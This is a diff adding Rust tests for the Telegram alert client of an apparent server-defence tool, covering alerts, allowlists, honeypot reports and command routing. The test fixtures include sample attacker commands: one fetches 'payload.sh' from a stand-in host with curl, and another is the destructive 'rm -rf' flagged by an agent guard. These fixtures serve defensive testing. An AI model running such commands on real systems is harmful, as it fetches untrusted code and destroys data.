@@ -1745,6 +1745,7 @@ mod tests {
     struct MockTelegramState {
         requests: Arc<tokio::sync::Mutex<Vec<MockRequest>>>,
         updates: Arc<tokio::sync::Mutex<VecDeque<serde_json::Value>>>,
+        force_send_not_ok: bool,
     }
 
     async fn mock_telegram_handler(
@@ -1769,6 +1770,11 @@ mod tests {
                 .pop_front()
                 .unwrap_or_else(|| json!({ "ok": true, "result": [] }));
             Json(next)
+        } else if state.force_send_not_ok {
+            Json(json!({
+                "ok": false,
+                "description": "forced mock Telegram API failure"
+            }))
         } else {
             Json(json!({
                 "ok": true,
@@ -1785,11 +1791,24 @@ mod tests {
         u16,
         tempfile::TempDir,
     )> {
+        start_mock_telegram_server_with_options(updates, false).await
+    }
+
+    async fn start_mock_telegram_server_with_options(
+        updates: Vec<serde_json::Value>,
+        force_send_not_ok: bool,
+    ) -> anyhow::Result<(
+        MockTelegramState,
+        tokio::task::JoinHandle<()>,
+        u16,
+        tempfile::TempDir,
+    )> {
         let _ = rustls::crypto::ring::default_provider().install_default();
 
         let state = MockTelegramState {
             requests: Arc::new(tokio::sync::Mutex::new(Vec::new())),
             updates: Arc::new(tokio::sync::Mutex::new(VecDeque::from(updates))),
+            force_send_not_ok,
         };
 
         let app = Router::new()
@@ -1870,6 +1889,65 @@ mod tests {
             tags: vec!["ssh".to_string()],
             entities: vec![EntityRef::ip("198.51.100.10".to_string())],
         }
+    }
+
+    async fn assert_polling_send_failure_line(target_callback_data: &str) -> anyhow::Result<()> {
+        let mut callbacks = Vec::new();
+        for idx in 0..8_i64 {
+            callbacks.push(json!({
+                "update_id": 600 + idx,
+                "callback_query": {
+                    "id": format!("warmup-{idx}"),
+                    "from": { "first_name": "Eve" },
+                    "data": "dismiss2fa",
+                    "message": { "message_id": 7000 + idx, "chat": { "id": 88 } }
+                }
+            }));
+        }
+        callbacks.push(json!({
+            "update_id": 700,
+            "callback_query": {
+                "id": "target-cb",
+                "from": { "first_name": "Eve" },
+                "data": target_callback_data,
+                "message": { "message_id": 7999, "chat": { "id": 88 } }
+            }
+        }));
+
+        let updates = vec![json!({ "ok": true, "result": callbacks })];
+        let (state, server, port, _cert_dir) = start_mock_telegram_server(updates).await?;
+        let client = Arc::new(build_test_client(port)?);
+        let (tx, rx) = mpsc::channel::<ApprovalResult>(8);
+        let mut task = tokio::spawn(client.run_polling(tx));
+
+        for _ in 0..60usize {
+            let saw_get_updates = {
+                state
+                    .requests
+                    .lock()
+                    .await
+                    .iter()
+                    .any(|r| r.path.ends_with("/getUpdates"))
+            };
+            if saw_get_updates {
+                break;
+            }
+            tokio::time::sleep(Duration::from_millis(10)).await;
+        }
+        drop(rx);
+
+        if tokio::time::timeout(Duration::from_secs(3), &mut task)
+            .await
+            .is_err()
+        {
+            task.abort();
+            return Err(anyhow::anyhow!(
+                "run_polling did not exit after forced send failure for {target_callback_data}"
+            ));
+        }
+
+        server.abort();
+        Ok(())
     }
 
     #[tokio::test]
@@ -2128,6 +2206,675 @@ mod tests {
                 .contains("subject_type=ip"),
             "dashboard deep-link should include subject_type=ip"
         );
+
+        server.abort();
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn exercise_client_message_methods_and_allowlist_helpers() -> anyhow::Result<()> {
+        let (state, server, port, _cert_dir) = start_mock_telegram_server(vec![]).await?;
+        let client = build_test_client(port)?;
+
+        let incident = make_incident();
+        let mut incident_without_ip = make_incident();
+        incident_without_ip.entities.clear();
+
+        client
+            .send_incident_alert(&incident, GuardianMode::Guard, false)
+            .await?;
+        client
+            .send_incident_alert(&incident_without_ip, GuardianMode::Watch, true)
+            .await?;
+
+        let reputation = crate::abuseipdb::IpReputation {
+            confidence_score: 92,
+            total_reports: 42,
+            distinct_users: 10,
+            country_code: Some("US".to_string()),
+            isp: Some("ExampleISP".to_string()),
+            is_tor: false,
+        };
+        let geo = crate::geoip::GeoInfo {
+            country: "United States".to_string(),
+            country_code: "US".to_string(),
+            city: "Ashburn".to_string(),
+            isp: "ExampleISP".to_string(),
+            asn: "AS13335".to_string(),
+        };
+
+        client
+            .send_action_report(
+                "Block IP",
+                "198.51.100.10",
+                "SSH brute force burst",
+                0.97,
+                "srv-01",
+                false,
+                Some(&reputation),
+                Some(&geo),
+                true,
+            )
+            .await?;
+        client
+            .send_action_report(
+                "Ignore",
+                "198.51.100.10",
+                "SSH brute force burst",
+                0.62,
+                "srv-01",
+                false,
+                None,
+                None,
+                false,
+            )
+            .await?;
+        client
+            .send_action_report(
+                "Block IP",
+                "198.51.100.10",
+                "SSH brute force burst",
+                0.73,
+                "srv-01",
+                true,
+                None,
+                None,
+                false,
+            )
+            .await?;
+
+        let guard_alert = crate::dashboard::AgentGuardAlert {
+            ts: chrono::Utc::now(),
+            agent_name: "CodexRunner".to_string(),
+            command: "rm -rf /tmp/malicious".to_string(),
+            risk_score: 91,
+            severity: "high".to_string(),
+            recommendation: "deny".to_string(),
+            signals: vec!["dangerous_command".to_string()],
+            atr_rule_ids: vec!["ATR-001".to_string()],
+            explanation: "dangerous operation".to_string(),
+        };
+        client.send_agent_guard_alert(&guard_alert).await?;
+
+        client
+            .send_onboarding("srv-01", 0, 0, GuardianMode::Guard)
+            .await?;
+        client
+            .send_onboarding("srv-01", 3, 2, GuardianMode::Watch)
+            .await?;
+
+        let suggestion_msg_id = client
+            .send_honeypot_suggestion(&incident, "198.51.100.10", "new hostile IP", 0.88, "block")
+            .await?;
+        assert_eq!(suggestion_msg_id, 777);
+
+        client
+            .resolve_confirmation(777, true, false, "Alice")
+            .await?;
+        client
+            .resolve_confirmation(778, false, true, "Alice")
+            .await?;
+
+        let rich_iocs = crate::ioc::ExtractedIocs {
+            ips: vec!["203.0.113.1".to_string()],
+            domains: vec![],
+            urls: vec!["http://bad.example/payload.sh".to_string()],
+            categories: vec![],
+        };
+        let commands = vec![
+            "whoami".to_string(),
+            "curl http://bad.example/payload.sh".to_string(),
+        ];
+        let credentials = vec![("root".to_string(), Some("toor".to_string()))];
+        client
+            .send_honeypot_session_report(
+                "198.51.100.10",
+                "sess-1",
+                45,
+                &commands,
+                &credentials,
+                &rich_iocs,
+                "malicious",
+                false,
+            )
+            .await?;
+        client
+            .send_honeypot_session_report(
+                "198.51.100.10",
+                "sess-2",
+                5,
+                &Vec::new(),
+                &Vec::new(),
+                &crate::ioc::ExtractedIocs::default(),
+                "probe-only",
+                true,
+            )
+            .await?;
+
+        client.send_text_message("<b>digest</b>").await?;
+        client
+            .send_text_with_keyboard(
+                "<b>menu</b>",
+                json!([[{"text": "Help", "callback_data": "menu:help"}]]),
+            )
+            .await?;
+        client.send_menu(true).await?;
+        client.send_menu(false).await?;
+        client.react_eyes(42, 100).await;
+        client.react(42, 101, "✅").await;
+        client.send_typing().await;
+        client.set_commands().await;
+
+        let dir = tempfile::tempdir()?;
+        let allowlist_path = dir.path().join("allowlist.toml");
+        append_to_allowlist(&allowlist_path, "ips", "203.0.113.5", "known scanner")?;
+        append_to_allowlist(&allowlist_path, "processes", "sshd", "safe daemon")?;
+        log_allowlist_change(dir.path(), "203.0.113.5", "ips", "alice", "add");
+        log_allowlist_change(dir.path(), "203.0.113.5", "ips", "alice", "remove");
+        log_allowlist_change(dir.path(), "sshd", "processes", "alice", "add");
+
+        let undoable = read_undoable_allowlist_entries(dir.path(), 10);
+        assert!(
+            undoable
+                .iter()
+                .any(|(key, section, _, _)| key == "sshd" && section == "processes"),
+            "process entry should remain undoable"
+        );
+        assert!(
+            undoable
+                .iter()
+                .all(|(key, section, _, _)| !(key == "203.0.113.5" && section == "ips")),
+            "removed ip entry should not remain undoable"
+        );
+
+        remove_from_allowlist(&allowlist_path, "ips", "203.0.113.5")?;
+        let allowlist_text = std::fs::read_to_string(&allowlist_path)?;
+        assert!(!allowlist_text.contains("203.0.113.5"));
+
+        let requests = state.requests.lock().await.clone();
+        assert!(
+            requests.iter().any(|r| r.path.ends_with("/setMyCommands")),
+            "set_commands should hit setMyCommands endpoint"
+        );
+        assert!(
+            requests
+                .iter()
+                .filter(|r| r.path.ends_with("/sendMessage"))
+                .count()
+                >= 10,
+            "method exercise should issue many sendMessage calls"
+        );
+
+        server.abort();
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn run_polling_handles_fp_check_explain_quick_ignore_and_invalid_ip() -> anyhow::Result<()>
+    {
+        let updates = vec![json!({
+            "ok": true,
+            "result": [
+                {
+                    "update_id": 21,
+                    "callback_query": {
+                        "id": "cb-21",
+                        "from": { "first_name": "Bob" },
+                        "data": "fp:check:incident-with-very-long-id-that-needs-truncation-1234567890",
+                        "message": { "message_id": 2021, "chat": { "id": 99 } }
+                    }
+                },
+                {
+                    "update_id": 22,
+                    "callback_query": {
+                        "id": "cb-22",
+                        "from": { "first_name": "Bob" },
+                        "data": "explain:ssh_bruteforce",
+                        "message": { "message_id": 2022, "chat": { "id": 99 } }
+                    }
+                },
+                {
+                    "update_id": 23,
+                    "callback_query": {
+                        "id": "cb-23",
+                        "from": { "first_name": "Bob" },
+                        "data": "quick:ignore",
+                        "message": { "message_id": 2023, "chat": { "id": 99 } }
+                    }
+                },
+                {
+                    "update_id": 24,
+                    "callback_query": {
+                        "id": "cb-24",
+                        "from": { "first_name": "Bob" },
+                        "data": "quick:block:not-an-ip",
+                        "message": { "message_id": 2024, "chat": { "id": 99 } }
+                    }
+                },
+                {
+                    "update_id": 25,
+                    "callback_query": {
+                        "id": "cb-25",
+                        "from": { "first_name": "Bob" },
+                        "data": "reject:incident-xyz",
+                        "message": { "message_id": 2025, "chat": { "id": 99 } }
+                    }
+                },
+                {
+                    "update_id": 26,
+                    "message": {
+                        "message_id": 2026,
+                        "text": "/start",
+                        "from": { "first_name": "Bob" },
+                        "chat": { "id": 99 }
+                    }
+                }
+            ]
+        })];
+
+        let (_state, server, port, _cert_dir) = start_mock_telegram_server(updates).await?;
+        let client = Arc::new(build_test_client(port)?);
+        let (tx, mut rx) = mpsc::channel::<ApprovalResult>(16);
+        let mut task = tokio::spawn(client.run_polling(tx));
+
+        let first = tokio::time::timeout(Duration::from_secs(2), rx.recv())
+            .await
+            .context("timed out waiting for first routed result")?
+            .context("approval channel closed before first result")?;
+        let second = tokio::time::timeout(Duration::from_secs(2), rx.recv())
+            .await
+            .context("timed out waiting for second routed result")?
+            .context("approval channel closed before second result")?;
+
+        let ids = vec![first.incident_id, second.incident_id];
+        assert!(
+            ids.iter().any(|id| id == "incident-xyz"),
+            "reject callback should route parsed incident id"
+        );
+        assert!(
+            ids.iter().any(|id| id == "__start__"),
+            "/start message should route to __start__ sentinel"
+        );
+
+        drop(rx);
+        if tokio::time::timeout(Duration::from_secs(2), &mut task)
+            .await
+            .is_err()
+        {
+            task.abort();
+        }
+        server.abort();
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn get_updates_returns_empty_when_result_cannot_deserialize() -> anyhow::Result<()> {
+        let updates = vec![json!({
+            "ok": true,
+            "result": { "unexpected": "shape" }
+        })];
+        let (_state, server, port, _cert_dir) = start_mock_telegram_server(updates).await?;
+        let client = build_test_client(port)?;
+
+        let parsed = client.get_updates(0).await?;
+        assert!(
+            parsed.is_empty(),
+            "malformed getUpdates payload should be treated as empty"
+        );
+
+        server.abort();
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn exercise_remaining_client_message_branches() -> anyhow::Result<()> {
+        use std::sync::atomic::Ordering;
+
+        let (_state, server, port, _cert_dir) = start_mock_telegram_server(vec![]).await?;
+        let client = build_test_client(port)?;
+        let incident = make_incident();
+
+        client
+            .send_incident_alert(&incident, GuardianMode::Watch, false)
+            .await?;
+
+        let geo = crate::geoip::GeoInfo {
+            country: "France".to_string(),
+            country_code: "FR".to_string(),
+            city: "Paris".to_string(),
+            isp: "ISP Corp".to_string(),
+            asn: "AS64512".to_string(),
+        };
+        client
+            .send_action_report(
+                "Block IP",
+                "198.51.100.10",
+                "Suspicious login wave",
+                0.88,
+                "srv-01",
+                false,
+                None,
+                Some(&geo),
+                false,
+            )
+            .await?;
+        client
+            .send_action_report(
+                "Block IP",
+                "198.51.100.10",
+                "Possible scanner",
+                0.52,
+                "srv-01",
+                false,
+                None,
+                None,
+                false,
+            )
+            .await?;
+        client
+            .send_action_report(
+                "Block IP",
+                "198.51.100.10",
+                "Sustained suspicious probing",
+                0.73,
+                "srv-01",
+                false,
+                None,
+                None,
+                false,
+            )
+            .await?;
+
+        for confidence in [0.80_f32, 0.65_f32, 0.40_f32] {
+            let msg_id = client
+                .send_confirmation_request(
+                    &incident,
+                    "ufw deny from 198.51.100.10",
+                    "block-ip",
+                    confidence,
+                    30,
+                )
+                .await?;
+            assert_eq!(msg_id, 777);
+        }
+
+        let medium_review_alert = crate::dashboard::AgentGuardAlert {
+            ts: chrono::Utc::now(),
+            agent_name: "OperatorBot".to_string(),
+            command: "x".repeat(160),
+            risk_score: 63,
+            severity: "medium".to_string(),
+            recommendation: "review".to_string(),
+            signals: vec![],
+            atr_rule_ids: vec![],
+            explanation: "needs operator review".to_string(),
+        };
+        client.send_agent_guard_alert(&medium_review_alert).await?;
+        let low_monitor_alert = crate::dashboard::AgentGuardAlert {
+            ts: chrono::Utc::now(),
+            agent_name: "OperatorBot".to_string(),
+            command: "cat /tmp/suspicious.log".to_string(),
+            risk_score: 24,
+            severity: "low".to_string(),
+            recommendation: "monitor".to_string(),
+            signals: vec!["odd_file_access".to_string()],
+            atr_rule_ids: vec![],
+            explanation: "watching low-risk behavior".to_string(),
+        };
+        client.send_agent_guard_alert(&low_monitor_alert).await?;
+
+        client
+            .send_honeypot_suggestion(
+                &incident,
+                "198.51.100.11",
+                "credential stuffing",
+                0.83,
+                "honeypot",
+            )
+            .await?;
+        client
+            .send_honeypot_suggestion(
+                &incident,
+                "198.51.100.12",
+                "scanning behavior",
+                0.79,
+                "monitor",
+            )
+            .await?;
+        client
+            .resolve_confirmation(900, false, false, "Charlie")
+            .await?;
+
+        let mut many_credentials = Vec::new();
+        for idx in 0..11usize {
+            many_credentials.push((
+                format!("user{idx}"),
+                Some("avery-very-very-long-password-value".to_string()),
+            ));
+        }
+        let honeypot_commands = vec!["uname -a".to_string()];
+        client
+            .send_honeypot_session_report(
+                "198.51.100.20",
+                "sess-extended",
+                120,
+                &honeypot_commands,
+                &many_credentials,
+                &crate::ioc::ExtractedIocs::default(),
+                "credential harvesting",
+                false,
+            )
+            .await?;
+
+        let mut client_no_dashboard = build_test_client(port)?;
+        client_no_dashboard.dashboard_url = None;
+        client_no_dashboard
+            .send_honeypot_session_report(
+                "198.51.100.30",
+                "sess-no-buttons",
+                8,
+                &Vec::new(),
+                &Vec::new(),
+                &crate::ioc::ExtractedIocs::default(),
+                "probe-only",
+                true,
+            )
+            .await?;
+
+        client
+            .send_abuseipdb_autoblock(
+                "203.0.113.99",
+                55,
+                50,
+                0,
+                None,
+                None,
+                "Reputation gate in dry-run",
+                true,
+                None,
+            )
+            .await?;
+
+        let current_hour: u32 = chrono::Utc::now()
+            .format("%H")
+            .to_string()
+            .parse()
+            .unwrap_or(0);
+        client
+            .alert_counter_hour
+            .store((current_hour + 1) % 24, Ordering::Relaxed);
+        client.alerts_this_hour.store(9, Ordering::Relaxed);
+        client.send_alert_html("<b>reset-check</b>").await?;
+        assert_eq!(
+            client.alert_counter_hour.load(Ordering::Relaxed),
+            current_hour
+        );
+        assert_eq!(client.alerts_this_hour.load(Ordering::Relaxed), 1);
+
+        let empty_dir = tempfile::tempdir()?;
+        assert!(
+            read_undoable_allowlist_entries(empty_dir.path(), 5).is_empty(),
+            "missing history file should produce no undoable entries"
+        );
+
+        server.abort();
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn run_polling_routes_honeypot_variants_and_text_aliases() -> anyhow::Result<()> {
+        let mut result = vec![
+            json!({
+                "update_id": 301,
+                "callback_query": {
+                    "id": "cb-301",
+                    "from": { "first_name": "Dana" },
+                    "data": "hpot:honeypot:3.3.3.3",
+                    "message": { "message_id": 3001, "chat": { "id": 77 } }
+                }
+            }),
+            json!({
+                "update_id": 302,
+                "callback_query": {
+                    "id": "cb-302",
+                    "from": { "first_name": "Dana" },
+                    "data": "hpot:block:4.4.4.4",
+                    "message": { "message_id": 3002, "chat": { "id": 77 } }
+                }
+            }),
+            json!({
+                "update_id": 303,
+                "callback_query": {
+                    "id": "cb-303",
+                    "from": { "first_name": "Dana" },
+                    "data": "hpot:ignore:5.5.5.5",
+                    "message": { "message_id": 3003, "chat": { "id": 77 } }
+                }
+            }),
+        ];
+        let text_commands = [
+            "/status@InnerWardenBot",
+            "/help details",
+            "/menu now",
+            "/incidents now",
+            "/threats now",
+            "/decisions now",
+            "/blocked now",
+            "/guard now",
+            "/watch now",
+            "/doctor now",
+            "/capabilities now",
+            "/list now",
+            "/disable ai",
+            "/undo now",
+            "/ask why did this trigger?",
+            "what changed today?",
+            "/foobar",
+        ];
+        for (idx, text_command) in (1usize..).zip(text_commands.iter()) {
+            result.push(json!({
+                "update_id": 303 + idx as i64,
+                "message": {
+                    "message_id": 3100 + idx as i64,
+                    "text": text_command,
+                    "from": { "first_name": "Dana" },
+                    "chat": { "id": 77 }
+                }
+            }));
+        }
+
+        let updates = vec![json!({ "ok": true, "result": result })];
+        let (_state, server, port, _cert_dir) = start_mock_telegram_server(updates).await?;
+        let client = Arc::new(build_test_client(port)?);
+        let (tx, mut rx) = mpsc::channel::<ApprovalResult>(64);
+        let mut task = tokio::spawn(client.run_polling(tx));
+
+        let mut incident_ids = Vec::new();
+        for _ in 0..20usize {
+            let routed = tokio::time::timeout(Duration::from_secs(2), rx.recv())
+                .await
+                .context("timed out waiting for routed polling result")?
+                .context("approval channel closed before collecting all results")?;
+            incident_ids.push(routed.incident_id);
+        }
+
+        for expected in [
+            "__hpot__:3.3.3.3",
+            "__hpot__:4.4.4.4",
+            "__hpot__:5.5.5.5",
+            "__status__",
+            "__help__",
+            "__menu__",
+            "__threats__",
+            "__decisions__",
+            "__blocked__",
+            "__guard__",
+            "__watch__",
+            "__doctor__",
+            "__capabilities__",
+            "__disable__:ai",
+            "__undo__",
+            "__ask__:why did this trigger?",
+            "__ask__:what changed today?",
+            "__unknown_cmd__",
+        ] {
+            assert!(
+                incident_ids.iter().any(|id| id == expected),
+                "missing routed text/callback variant: {expected}"
+            );
+        }
+
+        drop(rx);
+        if tokio::time::timeout(Duration::from_secs(2), &mut task)
+            .await
+            .is_err()
+        {
+            task.abort();
+        }
+
+        server.abort();
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn run_polling_send_failure_paths_return_early() -> anyhow::Result<()> {
+        for target_callback_data in [
+            "quick:block:1.2.3.4",
+            "hpot:block:2.2.2.2",
+            "allow:proc:sshd",
+            "allow:ip:10.0.0.1",
+            "fp:incident-123",
+            "autofp:no:proc:sshd",
+            "undo:proc:sshd",
+            "enable2fa",
+            "reject:incident-xyz",
+        ] {
+            assert_polling_send_failure_line(target_callback_data).await?;
+        }
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn run_polling_covers_get_updates_error_branch() -> anyhow::Result<()> {
+        let client = Arc::new(build_test_client(65001)?);
+        let (tx, rx) = mpsc::channel::<ApprovalResult>(1);
+        let mut task = tokio::spawn(client.run_polling(tx));
+
+        tokio::time::sleep(Duration::from_millis(250)).await;
+        drop(rx);
+        tokio::time::sleep(Duration::from_millis(150)).await;
+        task.abort();
+        let _ = task.await;
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn send_text_message_handles_not_ok_telegram_response() -> anyhow::Result<()> {
+        let (_state, server, port, _cert_dir) =
+            start_mock_telegram_server_with_options(vec![], true).await?;
+        let client = build_test_client(port)?;
+
+        client.send_text_message("<b>still ok</b>").await?;
 
         server.abort();
         Ok(())
